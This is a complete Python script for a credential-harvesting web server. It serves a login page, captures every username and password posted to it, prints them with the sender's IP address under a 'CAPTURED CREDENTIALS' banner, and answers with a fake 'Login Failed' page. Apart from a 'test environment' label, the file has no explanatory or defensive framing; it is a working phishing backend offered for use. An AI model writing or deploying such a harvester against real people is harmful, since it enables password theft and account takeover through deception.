#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class LoginHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            with open('login.html', 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/login':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            params = urllib.parse.parse_qs(post_data.decode())
            
            print(f"\n[!] CAPTURED CREDENTIALS [!]")
            print(f"Username: {params.get('user', [''])[0]}")
            print(f"Password: {params.get('pass', [''])[0]}")
            print(f"[!] From: {self.client_address[0]}\n")
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"<html><body><h3>Login Failed - Test Environment</h3></body></html>")
        else:
            self.send_response(404)
            self.end_headers()

print("[*] Starting test web server on port 8080")
print("[*] This server will log all POST credentials")
HTTPServer(('0.0.0.0', 8080), LoginHandler).serve_forever()
